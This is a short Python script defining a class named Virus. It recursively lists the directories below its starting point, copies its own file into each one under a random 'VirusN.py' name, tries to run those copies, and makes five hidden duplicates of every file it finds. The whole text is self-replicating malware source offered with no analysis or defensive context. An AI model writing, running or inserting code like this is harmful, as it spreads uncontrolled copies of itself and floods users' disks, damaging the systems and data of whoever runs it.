import os
import shutil
import random

class Virus:
    def __init__(self,path=None,target_dir=None,repeat=None):
        self.path=path
        self.target_dir=[]
        self.repeat=5
        self.own_path=os.path.realpath(__file__)
    
    def list_directories(self,path):
        self.target_dir.append(path)
        currentdir=os.listdir(path)
        for i in currentdir:
            if not i.startswith("."):
                absolutepath=os.path.join(path,i)
                if os.path.isdir(absolutepath):
                    self.list_directories(absolutepath)
                else:
                    pass
    
    def new_virus(self):
        for i in self.target_dir:
            n=random.randint(0,10)
            newName="Virus"+str(n)+".py"
            destination=os.path.join(i,newName)
            shutil.copyfile(self.own_path,destination)
            os.system(newName+" 1")

    def replicate(self):
        for i in self.target_dir:
            files=os.listdir(i)
            for file in files:
                abspath=os.path.join(i,file)
                if not abspath.startswith(".") and not os.path.isdir(abspath):
                    source=abspath
                    for j in range(self.repeat):
                        destination=os.path.join(i,("."+file+str(j)))
                        shutil.copyfile(source,destination)

    def virusAction(self):
        self.list_directories(self.path)
        self.new_virus()
        self.replicate()

if __name__=="__main__":
    currentdir=os.path.abspath("")
    virus=Virus(path=currentdir)
    virus.virusAction()